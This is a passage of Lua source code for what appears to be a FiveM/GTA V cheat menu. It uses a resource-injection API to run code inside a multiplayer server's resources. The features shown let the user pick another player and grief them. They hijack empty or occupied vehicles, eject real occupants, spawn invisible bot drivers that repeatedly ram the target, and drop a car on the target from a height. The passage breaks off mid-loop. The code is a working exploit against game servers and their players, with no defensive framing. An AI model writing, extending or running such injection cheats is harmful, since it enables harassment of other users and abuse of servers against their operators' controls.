            TaskWarpPedIntoVehicle(playerPed, closestEmptyVehicle, -1)
            ClearPedTasksImmediately(playerPed)
            TaskLeaveVehicle(playerPed, closestEmptyVehicle, 0)
            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
            SetEntityHeading(playerPed, originalHeading)
            SetEntityVisible(playerPed, true, false)
            
            -- Single VDM attack using MachoInjectResource
            MachoInjectResource("any", [[
                Citizen.CreateThread(function()
                    local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                    local targetVehicle = ]] .. closestEmptyVehicle .. [[
                    
                    if DoesEntityExist(targetPed) and DoesEntityExist(targetVehicle) then
                        local targetPos = GetEntityCoords(targetPed)
                        local targetHeading = GetEntityHeading(targetPed)
                        local forwardVec = GetEntityForwardVector(targetPed)
                        local spawnPos = targetPos + forwardVec * 15.0
                        
                        NetworkRequestControlOfEntity(targetVehicle)
                        SetEntityAsMissionEntity(targetVehicle, true, true)
                        
                        -- إنشاء بوت للقيادة
                        local botModel = GetHashKey("mp_m_freemode_01")
                        RequestModel(botModel)
                        while not HasModelLoaded(botModel) do
                            Citizen.Wait(0)
                        end
                        
                        local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                        
                        SetEntityAsMissionEntity(botPed, false, false)
                        SetPedCanBeDraggedOut(botPed, false)
                        SetPedConfigFlag(botPed, 32, true)
                        SetPedFleeAttributes(botPed, 0, false)
                        SetPedCombatAttributes(botPed, 17, true)
                        SetPedSeeingRange(botPed, 0.0)
                        SetPedHearingRange(botPed, 0.0)
                        SetPedAlertness(botPed, 0)
                        SetPedKeepTask(botPed, true)
                        SetEntityCollision(botPed, false, false)
                        SetEntityVisible(botPed, true, false)
                        NetworkSetEntityInvisibleToNetwork(botPed, true)
                        
                        SetPedIntoVehicle(botPed, targetVehicle, -1)
                        
                        SetVehicleDoorsLocked(targetVehicle, 4)
                        SetVehicleEngineOn(targetVehicle, true, true, false)
                        SetVehicleEnginePowerMultiplier(targetVehicle, 2.0)
                        ModifyVehicleTopSpeed(targetVehicle, 1.5)
                        
                        -- Position vehicle and attack ONCE
                        SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                        SetEntityHeading(targetVehicle, targetHeading + 180.0)
                        PlaceObjectOnGroundProperly(targetVehicle)
                        
                        SetVehicleForwardSpeed(targetVehicle, 35.0)
                        TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 40.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                        
                        -- Clean up after 5 seconds
                        Citizen.Wait(5000)
                        if DoesEntityExist(botPed) then
                            DeleteEntity(botPed)
                        end
                        SetModelAsNoLongerNeeded(botModel)
                    end
                end)
            ]])
            
            local targetName = GetPlayerName(selectedPlayer)
            MachoMenuNotification("VDM", "Single attack launched on " .. targetName .. " using nearby vehicle")
            
        else
            MachoMenuNotification("Error", "No empty vehicles found near target player!")
        end
    end
end)
MachoMenuButton(PlayerSection, "Crush Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local targetPed = GetPlayerPed(selectedPlayer)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target player not found!")
        return
    end
    
    local playerPed = PlayerPedId()
    local originalPos = GetEntityCoords(playerPed)
    local originalHeading = GetEntityHeading(playerPed)
    local targetPos = GetEntityCoords(targetPed)
    
    -- البحث عن أقرب سيارة فارغة
    local closestEmptyVehicle = nil
    local closestDistance = 999999.0
    
    for vehicle in EnumerateVehicles() do
        if DoesEntityExist(vehicle) then
            local vehiclePos = GetEntityCoords(vehicle)
            local distance = #(targetPos - vehiclePos)
            
            if distance < 100.0 then
                local isVehicleEmpty = true
                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                
                for seat = -1, maxSeats do
                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                    if pedInSeat ~= 0 then
                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                        if playerId ~= -1 and IsPlayerActive(playerId) then
                            isVehicleEmpty = false
                            break
                        end
                    end
                end
                
                if isVehicleEmpty and distance < closestDistance then
                    closestEmptyVehicle = vehicle
                    closestDistance = distance
                end
            end
        end
    end
    
    if closestEmptyVehicle then
        -- Fast warp to get control
        SetEntityVisible(playerPed, false, false)
        ClearPedTasksImmediately(playerPed)
        TaskWarpPedIntoVehicle(playerPed, closestEmptyVehicle, -1)
        ClearPedTasksImmediately(playerPed)
        TaskLeaveVehicle(playerPed, closestEmptyVehicle, 0)
        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
        SetEntityHeading(playerPed, originalHeading)
        SetEntityVisible(playerPed, true, false)
        
        -- Car drop attack using MachoInjectResource
        MachoInjectResource("any", [[
            Citizen.CreateThread(function()
                local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                local dropVehicle = ]] .. closestEmptyVehicle .. [[
                
                if DoesEntityExist(targetPed) and DoesEntityExist(dropVehicle) then
                    local targetPos = GetEntityCoords(targetPed)
                    
                    NetworkRequestControlOfEntity(dropVehicle)
                    SetEntityAsMissionEntity(dropVehicle, true, true)
                    
                    Citizen.Wait(100)
                    
                    -- رفع السيارة فوق الهدف بـ 50 متر
                    local dropHeight = 50.0
                    local dropPos = vector3(targetPos.x, targetPos.y, targetPos.z + dropHeight)
                    
                    -- وضع السيارة فوق الهدف
                    SetEntityCoordsNoOffset(dropVehicle, dropPos.x, dropPos.y, dropPos.z, false, false, false)
                    SetEntityHeading(dropVehicle, 0.0)
                    
                    -- إيقاف المحرك
                    SetVehicleEngineOn(dropVehicle, false, false, false)
                    
                    -- إزالة أي قوى أو سرعات
                    SetEntityVelocity(dropVehicle, 0.0, 0.0, 0.0)
                    SetVehicleForwardSpeed(dropVehicle, 0.0)
                    
                    -- فقط تطبيق الجاذبية - لا force إضافية
                    SetEntityHasGravity(dropVehicle, true)
                    
                    -- لا حاجة لأي تحريك إضافي - الجاذبية ستسقط السيارة
                    
                    Citizen.Wait(100)
                    
                    -- التأكد من أن السيارة تتبع قوانين الفيزياء الطبيعية
                    ActivatePhysics(dropVehicle)
                end
            end)
        ]])
        
        local targetName = GetPlayerName(selectedPlayer)
        MachoMenuNotification("Car Drop", "Dropping car on " .. targetName)
        
    else
        MachoMenuNotification("Error", "No empty vehicles found near target player!")
    end
end)
MachoMenuCheckbox(PlayerSection, "VDM Player",
    function()
        enableVDM = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)  
            if targetPed and DoesEntityExist(targetPed) then
                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                local originalTargetPlayer = selectedPlayer -- حفظ الشخص المختار أصلاً
               
                -- إذا كان الشخص المختار في سيارة
                if targetVehicle ~= 0 then
                    local playerPed = PlayerPedId()
                    local originalPos = GetEntityCoords(playerPed)
                    local originalHeading = GetEntityHeading(playerPed)
                   
                    -- التحقق من أن السيارة فارغة من اللاعبين الحقيقيين
                    local isVehicleEmpty = true
                    local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                   
                    for seat = -1, maxSeats do
                        local pedInSeat = GetPedInVehicleSeat(targetVehicle, seat)
                        if pedInSeat ~= 0 then
                            -- Simply check if there's any ped in the seat (removed IsPlayerActive check)
                            local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                            if playerId ~= -1 then
                                isVehicleEmpty = false
                                break
                            end
                        end
                    end
                   
                    if isVehicleEmpty then
                        -- السيارة فارغة - وارب سريع جداً بدون أي انتظار
                        local playerPed = PlayerPedId()
                        local originalPos = GetEntityCoords(playerPed)
                        local originalHeading = GetEntityHeading(playerPed)
                       
                        SetEntityVisible(playerPed, false, false)
                        ClearPedTasksImmediately(playerPed)
                        TaskWarpPedIntoVehicle(playerPed, targetVehicle, -1)
                        ClearPedTasksImmediately(playerPed)
                        TaskLeaveVehicle(playerPed, targetVehicle, 0)
                        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                        SetEntityHeading(playerPed, originalHeading)
                        SetEntityVisible(playerPed, true, false)
                       
                        -- بدء الـ VDM فوراً
                        MachoInjectResource("any", [[
                            vdmActive = true
                            vdmBotPed = nil
                            vdmVehicle = nil
                            originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                           
                            Citizen.CreateThread(function()
                                local targetVehicle = ]] .. targetVehicle .. [[
                               
                                if DoesEntityExist(targetVehicle) and vdmActive then
                                    vdmVehicle = targetVehicle
                                   
                                    NetworkRequestControlOfEntity(targetVehicle)
                                    SetEntityAsMissionEntity(targetVehicle, true, true)
                                   
                                    SetVehicleDoorsLocked(targetVehicle, 4)
                                   
                                    -- إنشاء بوت للقيادة
                                    local botModel = GetHashKey("mp_m_freemode_01")
                                    RequestModel(botModel)
                                    while not HasModelLoaded(botModel) do
                                        if not vdmActive then return end
                                        Citizen.Wait(0)
                                    end
                                   
                                    if not vdmActive then return end
                                   
                                    local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                    vdmBotPed = botPed
                                   
                                    SetEntityAsMissionEntity(botPed, false, false)
                                    SetPedCanBeDraggedOut(botPed, false)
                                    SetPedConfigFlag(botPed, 32, true)
                                    SetPedFleeAttributes(botPed, 0, false)
                                    SetPedCombatAttributes(botPed, 17, true)
                                    SetPedSeeingRange(botPed, 0.0)
                                    SetPedHearingRange(botPed, 0.0)
                                    SetPedAlertness(botPed, 0)
                                    SetPedKeepTask(botPed, true)
                                    SetEntityCollision(botPed, false, false)
                                    SetEntityVisible(botPed, true, false)
                                    NetworkSetEntityInvisibleToNetwork(botPed, true)
                                   
                                    SetPedIntoVehicle(botPed, targetVehicle, -1)
                                   
                                    SetVehicleEngineOn(targetVehicle, true, true, false)
                                    SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                    ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                   
                                    -- حلقة VDM - تستهدف الشخص المختار أصلاً
                                    Citizen.CreateThread(function()
                                        while DoesEntityExist(targetVehicle) and vdmActive do
                                            local originalTarget = GetPlayerPed(originalTargetPlayer)
                                            if DoesEntityExist(originalTarget) then
                                                local targetPos = GetEntityCoords(originalTarget)
                                                local targetHeading = GetEntityHeading(originalTarget)
                                                local forwardVec = GetEntityForwardVector(originalTarget)
                                                local spawnPos = targetPos + forwardVec * 15.0
                                               
                                                SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                PlaceObjectOnGroundProperly(targetVehicle)
                                               
                                                SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                            end
                                           
                                            Citizen.Wait(1500)
                                        end
                                    end)
                                   
                                    SetModelAsNoLongerNeeded(botModel)
                                end
                            end)
                        ]])
                        MachoMenuNotification("Vehicle", "Fast Warp VDM activated - Hunting Player ID: " .. GetPlayerServerId(selectedPlayer))
                    else
                        -- السيارة مشغولة - استخدام الطريقة الأصلية (same logic, IsPlayerActive removed)
                        ClearPedTasksImmediately(playerPed)
                       
                        local originalPos = GetEntityCoords(playerPed)
                        local originalHeading = GetEntityHeading(playerPed)
                       
                        MachoInjectResource("any", [[
                            -- باقي الكود الأصلي للسيارة المشغولة
                            vdmActive = true
                            vdmBotPed = nil
                            vdmVehicle = nil
                            originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                           
                            Citizen.CreateThread(function()
                                local playerPed = PlayerPedId()
                                local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                                local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                                local originalHeading = ]] .. originalHeading .. [[
                               
                                if targetVehicle ~= 0 then
                                    vdmVehicle = targetVehicle
                                   
                                    SetVehicleDoorsLocked(targetVehicle, 1)
                                    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                                   
                                    SetEntityVisible(playerPed, false, false)
                                    TaskLeaveVehicle(targetPed, targetVehicle, 0)
                                    SetPedMoveRateOverride(playerPed, 10.0)
                                    ClearPedTasks(playerPed)
                                    SetVehicleForwardSpeed(targetVehicle, 0.0)
                                    TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                                   
                                    local keepHidden = true
                                    Citizen.CreateThread(function()
                                        while keepHidden and vdmActive do
                                            SetEntityVisible(playerPed, false, false)
                                            Citizen.Wait(10)
                                        end
                                    end)
                                   
                                    -- انتظار حتى يحصل على صلاحية السيارة تلقائياً من TaskEnterVehicle
                                    local controlAttempts = 0
                                    while not NetworkHasControlOfEntity(targetVehicle) and vdmActive and controlAttempts < 200 do
                                        Citizen.Wait(50)
                                        controlAttempts = controlAttempts + 1
                                    end
                                   
                                    Citizen.Wait(500)
                                    keepHidden = false
                                   
                                    if not vdmActive then return end
                                   
                                    ClearPedTasksImmediately(playerPed)
                                    SetEntityAsMissionEntity(playerPed, true, true)
                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                    SetEntityHeading(playerPed, originalHeading)
                                   
                                    for i = 1, 50 do
                                        if not vdmActive then break end
                                        SetEntityVisible(playerPed, false, false)
                                        Citizen.Wait(10)
                                    end
                                   
                                    if not vdmActive then return end
                                   
                                    Citizen.Wait(100)
                                    ClearPedTasksImmediately(playerPed)
                                    SetPedMoveRateOverride(playerPed, 1.0)
                                    SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                                    TaskWanderStandard(playerPed, 0.0, 0)
                                    Citizen.Wait(100)
                                    ClearPedTasksImmediately(playerPed)
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(100)
                                   
                                    if not vdmActive then return end
                                   
                                    ClearPedTasksImmediately(playerPed)
                                    SetPedMoveRateOverride(playerPed, 1.0)
                                    SetEntityAsMissionEntity(playerPed, false, false)
                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                    SetEntityHeading(playerPed, originalHeading)
                                    Citizen.Wait(100)
                                    TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                                    Citizen.Wait(600)
                                   
                                    if not vdmActive then return end
                                   
                                    ClearPedTasks(playerPed)
                                    SetEntityVisible(playerPed, true, false)
                                    Citizen.Wait(200)
                                   
                                    -- بدء VDM بعد عودة اللاعب
                                    if DoesEntityExist(targetVehicle) and vdmActive and NetworkHasControlOfEntity(targetVehicle) then
                                        SetEntityAsMissionEntity(targetVehicle, true, true)
                                        Citizen.Wait(100)
                                       
                                        if not vdmActive then return end
                                       
                                        SetVehicleDoorsLocked(targetVehicle, 4)
                                        local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                        for seat = 0, maxSeats do
                                            local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                            if ped ~= 0 and ped ~= playerPed then
                                                SetPedCanBeDraggedOut(ped, false)
                                                SetPedConfigFlag(ped, 32, true)
                                                TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                            end
                                        end
                                       
                                        -- إنشاء بوت للقيادة
                                        local botModel = GetHashKey("mp_m_freemode_01")
                                        RequestModel(botModel)
                                        while not HasModelLoaded(botModel) do
                                            if not vdmActive then return end
                                            Citizen.Wait(0)
                                        end
                                       
                                        if not vdmActive then return end
                                       
                                        local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                        vdmBotPed = botPed
                                       
                                        SetEntityAsMissionEntity(botPed, false, false)
                                        SetPedCanBeDraggedOut(botPed, false)
                                        SetPedConfigFlag(botPed, 32, true)
                                        SetPedFleeAttributes(botPed, 0, false)
                                        SetPedCombatAttributes(botPed, 17, true)
                                        SetPedSeeingRange(botPed, 0.0)
                                        SetPedHearingRange(botPed, 0.0)
                                        SetPedAlertness(botPed, 0)
                                        SetPedKeepTask(botPed, true)
                                        SetEntityCollision(botPed, false, false)
                                        SetEntityVisible(botPed, true, false)
                                        NetworkSetEntityInvisibleToNetwork(botPed, true)
                                       
                                        SetPedIntoVehicle(botPed, targetVehicle, -1)
                                        Citizen.Wait(100)
                                       
                                        if not vdmActive then
                                            if DoesEntityExist(botPed) then
                                                DeleteEntity(botPed)
                                            end
                                            return
                                        end
                                       
                                        SetVehicleDoorsLocked(targetVehicle, 4)
                                        SetVehicleEngineOn(targetVehicle, true, true, false)
                                        SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                        ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                       
                                        -- حلقة VDM
                                        Citizen.CreateThread(function()
                                            while DoesEntityExist(targetVehicle) and vdmActive do
                                                local originalTarget = GetPlayerPed(originalTargetPlayer)
                                                if DoesEntityExist(originalTarget) then
                                                    local targetPos = GetEntityCoords(originalTarget)
                                                    local targetHeading = GetEntityHeading(originalTarget)
                                                    local forwardVec = GetEntityForwardVector(originalTarget)
                                                    local spawnPos = targetPos + forwardVec * 15.0
                                                   
                                                    SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                    SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                    PlaceObjectOnGroundProperly(targetVehicle)
                                                   
                                                    SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                    TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                                end
                                               
                                                Citizen.Wait(1500)
                                            end
                                        end)
                                       
                                        SetModelAsNoLongerNeeded(botModel)
                                    end
                                end
                            end)
                        ]])
                        MachoMenuNotification("Vehicle", "VDM Bot activated (occupied vehicle) - Hunting Player ID: " .. GetPlayerServerId(selectedPlayer))
                    end
               
                -- إذا كان الشخص المختار ليس في سيارة - البحث عن السيارات الفارغة
                else
                    local playerPed = PlayerPedId()
                    local targetPos = GetEntityCoords(targetPed)
                    local originalPos = GetEntityCoords(playerPed)
                    local originalHeading = GetEntityHeading(playerPed)
                   
                    -- البحث عن أقرب سيارة فارغة
                    local closestEmptyVehicle = nil
                    local closestDistance = 999999.0
                   
                    for vehicle in EnumerateVehicles() do
                        if DoesEntityExist(vehicle) then
                            local vehiclePos = GetEntityCoords(vehicle)
                            local distance = #(targetPos - vehiclePos)
                           
                            if distance < 100.0 then
                                local isVehicleEmpty = true
                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                               
                                for seat = -1, maxSeats do
                                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                    if pedInSeat ~= 0 then
                                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                        if playerId ~= -1 then
                                            isVehicleEmpty = false
                                            break
                                        end
                                    end
                                end
                               
                                if isVehicleEmpty and distance < closestDistance then
                                    closestEmptyVehicle = vehicle
                                    closestDistance = distance
                                end
                            end
                        end
                    end
                   
                    if closestEmptyVehicle then
                        -- استخدام الوارب السريع للسيارة الفارغة
                        SetEntityVisible(playerPed, false, false)
                        ClearPedTasksImmediately(playerPed)
                        TaskWarpPedIntoVehicle(playerPed, closestEmptyVehicle, -1)
                        ClearPedTasksImmediately(playerPed)
                        TaskLeaveVehicle(playerPed, closestEmptyVehicle, 0)
                        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                        SetEntityHeading(playerPed, originalHeading)
                        SetEntityVisible(playerPed, true, false)
                       
                        MachoInjectResource("any", [[
                            vdmActive = true
                            vdmBotPed = nil
                            vdmVehicle = nil
                            originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                           
                            Citizen.CreateThread(function()
                                local targetVehicle = ]] .. closestEmptyVehicle .. [[
                               
                                if DoesEntityExist(targetVehicle) and vdmActive then
                                    vdmVehicle = targetVehicle
                                   
                                    NetworkRequestControlOfEntity(targetVehicle)
                                    SetEntityAsMissionEntity(targetVehicle, true, true)
                                   
                                    -- إنشاء بوت للقيادة
                                    local botModel = GetHashKey("mp_m_freemode_01")
                                    RequestModel(botModel)
                                    while not HasModelLoaded(botModel) do
                                        if not vdmActive then return end
                                        Citizen.Wait(0)
                                    end
                                   
                                    if not vdmActive then return end
                                   
                                    local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                    vdmBotPed = botPed
                                   
                                    SetEntityAsMissionEntity(botPed, false, false)
                                    SetPedCanBeDraggedOut(botPed, false)
                                    SetPedConfigFlag(botPed, 32, true)
                                    SetPedFleeAttributes(botPed, 0, false)
                                    SetPedCombatAttributes(botPed, 17, true)
                                    SetPedSeeingRange(botPed, 0.0)
                                    SetPedHearingRange(botPed, 0.0)
                                    SetPedAlertness(botPed, 0)
                                    SetPedKeepTask(botPed, true)
                                    SetEntityCollision(botPed, false, false)
                                    SetEntityVisible(botPed, true, false)
                                    NetworkSetEntityInvisibleToNetwork(botPed, true)
                                   
                                    SetPedIntoVehicle(botPed, targetVehicle, -1)
                                   
                                    SetVehicleDoorsLocked(targetVehicle, 4)
                                    SetVehicleEngineOn(targetVehicle, true, true, false)
                                    SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                    ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                   
                                    -- حلقة VDM
                                    Citizen.CreateThread(function()
                                        while DoesEntityExist(targetVehicle) and vdmActive do
                                            local originalTarget = GetPlayerPed(originalTargetPlayer)
                                            if DoesEntityExist(originalTarget) then
                                                local targetPos = GetEntityCoords(originalTarget)
                                                local targetHeading = GetEntityHeading(originalTarget)
                                                local forwardVec = GetEntityForwardVector(originalTarget)
                                                local spawnPos = targetPos + forwardVec * 15.0
                                               
                                                SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                PlaceObjectOnGroundProperly(targetVehicle)
                                               
                                                SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                            end
                                           
                                            Citizen.Wait(1500)
                                        end
                                    end)
                                   
                                    SetModelAsNoLongerNeeded(botModel)
                                end
                            end)
                        ]])
                        MachoMenuNotification("Vehicle", "Fast Warp - Empty vehicle VDM activated targeting Player ID: " .. GetPlayerServerId(selectedPlayer))
                    else
                        -- لم يتم العثور على سيارة فارغة - البحث عن أقرب سيارة بها لاعب حقيقي
                        local closestOccupiedVehicle = nil
                        local closestOccupiedDistance = 999999.0
                        local occupiedVehicleOwner = nil
                       
                        for vehicle in EnumerateVehicles() do
                            if DoesEntityExist(vehicle) then
                                local vehiclePos = GetEntityCoords(vehicle)
                                local distance = #(targetPos - vehiclePos)
                               
                                if distance < 100.0 then
                                    local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                   
                                    for seat = -1, maxSeats do
                                        local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                        if pedInSeat ~= 0 then
                                            local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                            if playerId ~= -1 and distance < closestOccupiedDistance then
                                                closestOccupiedVehicle = vehicle
                                                closestOccupiedDistance = distance
                                                occupiedVehicleOwner = playerId
                                                break
                                            end
                                        end
                                    end
                                end
                            end
                        end
                       
                        if closestOccupiedVehicle and occupiedVehicleOwner then
                            -- استخدام نفس خوارزمية TaskEnterVehicle للسيارة المشغولة
                            ClearPedTasksImmediately(playerPed)
                           
                            MachoInjectResource("any", [[
                                vdmActive = true
                                vdmBotPed = nil
                                vdmVehicle = nil
                                originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                               
                                Citizen.CreateThread(function()
                                    local playerPed = PlayerPedId()
                                    local targetVehicle = ]] .. closestOccupiedVehicle .. [[
                                    local vehicleOwnerPed = GetPlayerPed(]] .. occupiedVehicleOwner .. [[)
                                    local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                                    local originalHeading = ]] .. originalHeading .. [[
                                   
                                    if targetVehicle ~= 0 then
                                        vdmVehicle = targetVehicle
                                       
                                        SetVehicleDoorsLocked(targetVehicle, 1)
                                        SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                                       
                                        SetEntityVisible(playerPed, false, false)
                                        TaskLeaveVehicle(vehicleOwnerPed, targetVehicle, 0)
                                        SetPedMoveRateOverride(playerPed, 10.0)
                                        ClearPedTasks(playerPed)
                                        SetVehicleForwardSpeed(targetVehicle, 0.0)
                                        TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                                       
                                        local keepHidden = true
                                        Citizen.CreateThread(function()
                                            while keepHidden and vdmActive do
                                                SetEntityVisible(playerPed, false, false)
                                                Citizen.Wait(10)
                                            end
                                        end)
                                       
                                        -- انتظار حتى يحصل على صلاحية السيارة تلقائياً من TaskEnterVehicle
                                        local controlAttempts = 0
                                        while not NetworkHasControlOfEntity(targetVehicle) and vdmActive and controlAttempts < 200 do
                                            Citizen.Wait(50)
                                            controlAttempts = controlAttempts + 1
                                        end
                                       
                                        Citizen.Wait(500)
                                        keepHidden = false
                                       
                                        if not vdmActive then return end
                                       
                                        ClearPedTasksImmediately(playerPed)
                                        SetEntityAsMissionEntity(playerPed, true, true)
                                        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                        SetEntityHeading(playerPed, originalHeading)
                                       
                                        for i = 1, 50 do
                                            if not vdmActive then break end
                                            SetEntityVisible(playerPed, false, false)
                                            Citizen.Wait(10)
                                        end
                                       
                                        if not vdmActive then return end
                                       
                                        Citizen.Wait(100)
                                        ClearPedTasksImmediately(playerPed)
                                        SetPedMoveRateOverride(playerPed, 1.0)
                                        SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                                        TaskWanderStandard(playerPed, 0.0, 0)
                                        Citizen.Wait(100)
                                        ClearPedTasksImmediately(playerPed)
                                        SetEntityVisible(playerPed, false, false)
                                        Citizen.Wait(100)
                                       
                                        if not vdmActive then return end
                                       
                                        ClearPedTasksImmediately(playerPed)
                                        SetPedMoveRateOverride(playerPed, 1.0)
                                        SetEntityAsMissionEntity(playerPed, false, false)
                                        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                        SetEntityHeading(playerPed, originalHeading)
                                        Citizen.Wait(100)
                                        TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                                        Citizen.Wait(600)
                                       
                                        if not vdmActive then return end
                                       
                                        ClearPedTasks(playerPed)
                                        SetEntityVisible(playerPed, true, false)
                                        Citizen.Wait(200)
                                       
                                        -- بدء VDM بعد عودة اللاعب
                                        if DoesEntityExist(targetVehicle) and vdmActive and NetworkHasControlOfEntity(targetVehicle) then
                                            SetEntityAsMissionEntity(targetVehicle, true, true)
                                            Citizen.Wait(100)
                                           
                                            if not vdmActive then return end
                                           
                                            SetVehicleDoorsLocked(targetVehicle, 4)
                                            local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                            for seat = 0, maxSeats do
                                                local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                                if ped ~= 0 and ped ~= playerPed then
                                                    SetPedCanBeDraggedOut(ped, false)
                                                    SetPedConfigFlag(ped, 32, true)
                                                    TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                                end
                                            end
                                           
                                            -- إنشاء بوت للقيادة
                                            local botModel = GetHashKey("mp_m_freemode_01")
                                            RequestModel(botModel)
                                            while not HasModelLoaded(botModel) do
                                                if not vdmActive then return end
                                                Citizen.Wait(0)
                                            end
                                           
                                            if not vdmActive then return end
                                           
                                            local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                            vdmBotPed = botPed
                                           
                                            SetEntityAsMissionEntity(botPed, false, false)
                                            SetPedCanBeDraggedOut(botPed, false)
                                            SetPedConfigFlag(botPed, 32, true)
                                            SetPedFleeAttributes(botPed, 0, false)
                                            SetPedCombatAttributes(botPed, 17, true)
                                            SetPedSeeingRange(botPed, 0.0)
                                            SetPedHearingRange(botPed, 0.0)
                                            SetPedAlertness(botPed, 0)
                                            SetPedKeepTask(botPed, true)
                                            SetEntityCollision(botPed, false, false)
                                            SetEntityVisible(botPed, true, false)
                                            NetworkSetEntityInvisibleToNetwork(botPed, true)
                                           
                                            SetPedIntoVehicle(botPed, targetVehicle, -1)
                                            Citizen.Wait(100)
                                           
                                            if not vdmActive then
                                                if DoesEntityExist(botPed) then
                                                    DeleteEntity(botPed)
                                                end
                                                return
                                            end
                                           
                                            SetVehicleDoorsLocked(targetVehicle, 4)
                                            SetVehicleEngineOn(targetVehicle, true, true, false)
                                            SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                            ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                           
                                            -- حلقة VDM
                                            Citizen.CreateThread(function()
                                                while DoesEntityExist(targetVehicle) and vdmActive do
